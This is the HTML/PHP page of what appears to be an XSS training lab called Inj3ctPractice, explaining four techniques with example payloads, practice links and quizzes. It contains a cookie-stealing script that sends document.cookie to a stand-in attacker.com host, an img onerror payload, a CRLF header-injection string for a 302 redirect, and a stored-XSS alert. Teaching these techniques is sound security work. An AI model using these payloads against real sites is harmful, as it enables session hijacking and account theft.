<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inj3ctPractice</title>
    <link rel="stylesheet" href="contentpage.css">
    <style>
        body {
            background-image: url('background.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #fff; /* Ensure text is visible on dark background */
        }
        .container {
            display: flex;
            min-height: 100vh; /* Ensure the container spans the full height of the viewport */
        }
        .sidebar {
            width: 150px !important;
            background-color: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 20px;
            display: flex;
            flex-direction: column;
            height: 100vh; /* Ensure the sidebar spans the full height of the viewport */
        }
        .sidebar ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
            flex-grow: 1;
        }
        .sidebar ul li {
            margin-bottom: 10px;
        }
        .sidebar ul li a {
            color: #fff;
            text-decoration: none;
            letter-spacing: 2px;
            line-height: 1;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
            color: #000; /* Black text for better readability on light background */
            background-color: rgba(255, 255, 255, 0.9); /* Light background for content area */
            border-radius: 10px;
            margin: 20px;
            width: 100px;
        }
        .technique {
            margin-bottom: 20px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            background-color: #f9f9f9;
        }
        .technique h2 {
            margin-top: 0;
        }
        .button-group {
            margin-top: 20px;
        }
        .button-group button {
            margin-right: 10px;
            margin-bottom: 10px; /* Add margin bottom for spacing */
            padding: 10px 20px;
            border: none;
            background-color: #007BFF;
            color: #fff;
            border-radius: 5px;
            cursor: pointer;
        }
        .example {
            background-color: #333;
            padding: 5px;
            border-radius: 5px;
            margin-top: 10px;
        }
        .example pre {
            margin: 0;
            color: #fff; /* Ensure code text is visible on dark background */
        }   
    </style>
</head>
<body>
    <?php include 'topnav.php'; ?>
    <div class="container">
        <div class="sidebar">
            <ul>
                <li><a href="profile.php">Profile</a></li>
                <li><a href="contentpage.php">SQL techniques</a></li>
                <li><a href="contentpage2.php">XSScript techniques</a></li>
            </ul>
        </div>
        <div class="content">
            <!-- Technique 1: Universal XSS -->
            <div class="technique" id="technique1">
                <h2>Technique 1: Universal XSS</h2>
                <p>
                    Universal XSS exploits arbitrary JavaScript execution in any context, including server-side PDF generation or client-side interactions.
                </p>
                <h3>How does it work?</h3>
                <p>When user inputs a base URL (profile.png) and an XSS payload(e.g.,script alert('XSS' script), the script combines both of them to create the exploit URL.
                <div class="example">
                    <pre><code>&lt;img src="profile.png" onerror="document.write('test')" &gt;
                    </code></pre>
                </div>
                <h3>Resulting XSS query</h3>
                <p>In this case would be the provided image (profile.png): <img src = "profile.png"></p>
                <div class="button-group">
                    <form action="universalxss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 1">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>

            <!-- Technique 2: Cookie XSS -->
            <div class="technique" id="technique2">
                <h2>Technique 2: Cookie XSS</h2>
                <p>It is a common attack where the attacker injects malicious scripts into a web application to capture sensitive information stored in cookies. This can allow the attacker to hijack user sessions, impersonate users and gain unauthorized access to user accounts.</p>
                <h3>Example</h3>
                <div class="example">
                    <pre><code>&lt;script&gt;
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + document.cookie;
&lt;/script&gt;
                    </code></pre>
                </div>
                <div class="button-group">
                    <form action="cookiexss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 2">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>

            <!-- Technique 3: XSS with Header Injection in a 302 Response -->
            <div class="technique" id="technique3">
                <h2>Technique 3: XSS with Header Injection in a 302 Response</h2>
                <p>XSS in HTTP redirects, particularly with header injection in a 302 response, is an advanced technique used to bypass security mechanisms in modern browsers. This approach leverages the fact that redirects can be manipulated to execute malicious scripts, despite the recent efforts by browser developers to patch vulnerabilities.</p>
                <h3>How does it work?</h3>
                <div class="example">
                    <pre><code>https://example.com
                    </code></pre>
                </div>
                <p>When the URL is submitted, the script constructs an exploit URL ($exploit_url) by appending %0d%0aContent-Length:0%0d%0a%0d%0a script alert('XSS');script to the user-provided URL.</p>
                <div class="example">
                    <pre><code>https://https://example.com%0d%0aContent-Length:0%0d%0a%0d%0a

                    </code></pre>
                </div>
                <p>The script then outputs the generated exploit URL ($exploit_url) in a div class='output' and a clickable link that directs the user to the generated exploit URL.</p>
                <div class="example">
                    <pre><code>Click here to trigger XSS
                    </code></pre>
                </div>
                <div class="button-group">
                    <form action="headerxss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 3">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>

            <!-- Technique 4: Stored XSS -->
            <div class="technique" id="technique4">
                <h2>Technique 4: Stored XSS</h2>
                <p>Stored XSS occurs when a malicious script is injected directly into a target application and is stored on the server, affecting every user that accesses the page.</p>
                <h3>Example</h3>
                <div class="example">
                    <pre><code>&lt;script&gt;alert('Stored XSS');&lt;/script&gt;
                    </code></pre>
                </div>
                <div class="button-group">
                    <form action="xss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 4">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script src="scripts.js"></script>
</body>
</html>
